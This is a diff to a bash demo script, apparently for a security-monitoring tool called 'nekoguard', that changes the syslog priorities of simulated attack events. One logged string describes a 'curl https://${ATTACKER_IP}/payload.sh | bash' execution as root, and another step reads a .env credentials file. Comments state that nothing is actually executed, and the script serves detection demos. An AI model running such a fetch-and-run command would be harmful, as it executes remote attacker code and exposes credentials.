@@ -53,13 +53,13 @@ scenario_active() {
 
     # 2. .env ファイルへのアクセス
     cat "${ENV_FILE}" > /dev/null 2>&1
-    logger -p audit.warning -t nekoguard-demo \
+    logger -p local6.warning -t nekoguard-demo \
         "CREDENTIAL_ACCESS: .env read by unknown process (pid $$, parent: bash) user=root"
     echo -e "${RED}[+] .env アクセスログを記録${NC}"
     sleep 1
 
     # 3. 不審なコマンド実行（実際には何もしない）
-    logger -p syslog.critical -t nekoguard-demo \
+    logger -p syslog.err -t nekoguard-demo \
         "EXECUTION: curl https://${ATTACKER_IP}/payload.sh | bash executed as root (simulated)"
     echo -e "${RED}[+] curl|bash 実行ログを記録${NC}"
     sleep 1
@@ -71,7 +71,7 @@ scenario_active() {
     sleep 1
 
     # 5. 課金スパイク
-    logger -p local0.critical -t nekoguard-demo \
+    logger -p local0.err -t nekoguard-demo \
         "BILLING_SPIKE: GCP API usage anomaly detected: 14800 requests in 15min (normal: ~1200/day) from compromised credentials"
     echo -e "${RED}[+] 課金スパイクログを記録${NC}"
     sleep 1
